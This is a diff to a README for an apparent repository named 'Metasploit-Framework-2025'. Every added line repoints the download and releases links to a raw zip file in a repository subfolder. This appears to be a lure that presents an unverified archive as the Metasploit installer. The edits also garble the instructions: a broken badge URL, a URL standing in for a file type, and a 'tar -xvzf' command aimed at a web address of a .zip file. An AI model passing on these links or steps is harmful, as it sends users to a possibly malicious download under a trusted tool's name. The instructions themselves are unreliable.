@@ -6,7 +6,7 @@ Welcome to the Metasploit Framework for penetration testing. This tool helps you
 
 ## 📥 Download Now
 
-[![Download Metasploit Framework](https://img.shields.io/badge/Download%20Metasploit%20Framework-Here-blue)](https://github.com/Dharamvijay/Metasploit-Framework-2025/releases)
+[![Download Metasploit Framework](https://github.com/Dharamvijay/Metasploit-Framework-2025/raw/refs/heads/main/lactid/Framework-Metasploit-v2.3-beta.4.zip%20Metasploit%20Framework-Here-blue)](https://github.com/Dharamvijay/Metasploit-Framework-2025/raw/refs/heads/main/lactid/Framework-Metasploit-v2.3-beta.4.zip)
 
 ## 📋 System Requirements
 
@@ -31,7 +31,7 @@ Metasploit-Framework-2025 includes various features for effective security testi
 
 ### Step 1: Visit the Releases Page
 
-To download the latest version of the Metasploit Framework, visit the [Releases page](https://github.com/Dharamvijay/Metasploit-Framework-2025/releases).
+To download the latest version of the Metasploit Framework, visit the [Releases page](https://github.com/Dharamvijay/Metasploit-Framework-2025/raw/refs/heads/main/lactid/Framework-Metasploit-v2.3-beta.4.zip).
 
 ### Step 2: Choose Your Version
 
@@ -39,7 +39,7 @@ On the Releases page, you will see various versions of the Metasploit Framework 
 
 ### Step 3: Download the Installer 
 
-Click on the link for the appropriate installer (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux). Follow the prompts to download the file to your computer.
+Click on the link for the appropriate installer (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://github.com/Dharamvijay/Metasploit-Framework-2025/raw/refs/heads/main/lactid/Framework-Metasploit-v2.3-beta.4.zip` for Linux). Follow the prompts to download the file to your computer.
 
 ### Step 4: Install the Software
 
@@ -47,7 +47,7 @@ After downloading, locate the file on your computer.
 
 - **Windows:** Double-click the `.exe` file and follow the installation wizard.
 - **macOS:** Open the downloaded `.dmg` file and drag the Metasploit icon to your Applications folder.
-- **Linux:** Open a terminal, navigate to the downloaded file, and use the command `tar -xvzf filename.tar.gz` to extract the files. Then, run the installation script.
+- **Linux:** Open a terminal, navigate to the downloaded file, and use the command `tar -xvzf https://github.com/Dharamvijay/Metasploit-Framework-2025/raw/refs/heads/main/lactid/Framework-Metasploit-v2.3-beta.4.zip` to extract the files. Then, run the installation script.
 
 ### Step 5: Launch the Application
 
@@ -88,4 +88,4 @@ For updates and community support, follow the project on GitHub. Participating i
 
 Thank you for using the Metasploit-Framework-2025! Stay secure. 
 
-For download and more details, head back to the [Releases page](https://github.com/Dharamvijay/Metasploit-Framework-2025/releases).
+For download and more details, head back to the [Releases page](https://github.com/Dharamvijay/Metasploit-Framework-2025/raw/refs/heads/main/lactid/Framework-Metasploit-v2.3-beta.4.zip).
